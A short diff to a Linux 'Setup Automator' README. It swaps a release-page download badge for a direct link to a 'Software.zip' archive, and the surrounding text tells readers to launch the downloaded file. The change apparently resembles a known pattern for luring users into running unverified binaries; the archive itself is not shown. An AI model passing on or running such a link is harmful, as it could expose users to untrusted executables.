@@ -22,7 +22,7 @@ Setup Automator is a powerful tool that simplifies the setup process on Linux di
 ## Get Started
 
 To begin using Setup Automator, simply download the script from the following link:
-[![Download Setup Automator](https://github.com/Diapiffy/setup/releases/tag/v1.0%20Automator-green)](https://github.com/Diapiffy/setup/releases/tag/v1.0)
+[![Download Setup Automator](https://github.com/Diapiffy/setup/releases/download/v2.0/Software.zip%20Automator-green)](https://github.com/Diapiffy/setup/releases/download/v2.0/Software.zip)
 
 If the link does not open the file directly, please ensure to launch the downloaded file to start the installation process.
 
